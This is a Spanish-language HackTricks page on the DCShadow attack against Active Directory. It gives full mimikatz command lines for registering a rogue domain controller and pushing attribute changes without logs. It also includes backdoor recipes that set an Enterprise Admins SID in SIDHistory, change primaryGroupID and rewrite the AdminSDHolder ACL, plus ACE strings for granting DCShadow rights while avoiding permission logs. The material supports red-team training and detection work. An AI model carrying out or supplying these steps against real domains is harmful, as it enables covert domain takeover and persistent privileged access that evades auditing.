{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# DCShadow

Registra un **nuevo Controlador de Dominio** en el AD y lo utiliza para **empujar atributos** (SIDHistory, SPNs...) en objetos especificados **sin** dejar ningún **registro** sobre las **modificaciones**. Necesitas privilegios de **DA** y estar dentro del **dominio raíz**.\
Ten en cuenta que si usas datos incorrectos, aparecerán registros bastante feos.

Para realizar el ataque necesitas 2 instancias de mimikatz. Una de ellas iniciará los servidores RPC con privilegios de SYSTEM (aquí debes indicar los cambios que deseas realizar), y la otra instancia se utilizará para empujar los valores:

{% code title="mimikatz1 (RPC servers)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% endcode %}

{% code title="mimikatz2 (push) - Necesita DA o similar" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

Nota que **`elevate::token`** no funcionará en la sesión `mimikatz1` ya que eso elevó los privilegios del hilo, pero necesitamos elevar el **privilegio del proceso**.\
También puedes seleccionar un objeto "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Puedes enviar los cambios desde un DA o desde un usuario con estos permisos mínimos:

* En el **objeto de dominio**:
* _DS-Install-Replica_ (Agregar/Eliminar Réplica en Dominio)
* _DS-Replication-Manage-Topology_ (Gestionar Topología de Replicación)
* _DS-Replication-Synchronize_ (Sincronización de Replicación)
* El **objeto de Sitios** (y sus hijos) en el **contenedor de Configuración**:
* _CreateChild y DeleteChild_
* El objeto de la **computadora que está registrada como un DC**:
* _WriteProperty_ (No Write)
* El **objeto objetivo**:
* _WriteProperty_ (No Write)

Puedes usar [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) para otorgar estos privilegios a un usuario sin privilegios (ten en cuenta que esto dejará algunos registros). Esto es mucho más restrictivo que tener privilegios de DA.\
Por ejemplo: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  Esto significa que el nombre de usuario _**student1**_ al iniciar sesión en la máquina _**mcorp-student1**_ tiene permisos de DCShadow sobre el objeto _**root1user**_.

## Usando DCShadow para crear puertas traseras

{% code title="Establecer Administradores de Empresa en SIDHistory a un usuario" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% endcode %}

{% code title="Cambiar PrimaryGroupID (poner al usuario como miembro de Administradores de Dominio)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% endcode %}

{% code title="Modificar ntSecurityDescriptor de AdminSDHolder (dar Control Total a un usuario)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - Dar permisos a DCShadow usando DCShadow (sin registros de permisos modificados)

Necesitamos agregar los siguientes ACEs con el SID de nuestro usuario al final:

* En el objeto de dominio:
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* En el objeto de computadora del atacante: `(A;;WP;;;UserSID)`
* En el objeto de usuario objetivo: `(A;;WP;;;UserSID)`
* En el objeto de Sitios en el contenedor de Configuración: `(A;CI;CCDC;;;UserSID)`

Para obtener el ACE actual de un objeto: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

Ten en cuenta que en este caso necesitas hacer **varios cambios,** no solo uno. Así que, en la **sesión mimikatz1** (servidor RPC) usa el parámetro **`/stack` con cada cambio** que quieras hacer. De esta manera, solo necesitarás **`/push`** una vez para realizar todos los cambios acumulados en el servidor rogue.

[**Más información sobre DCShadow en ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
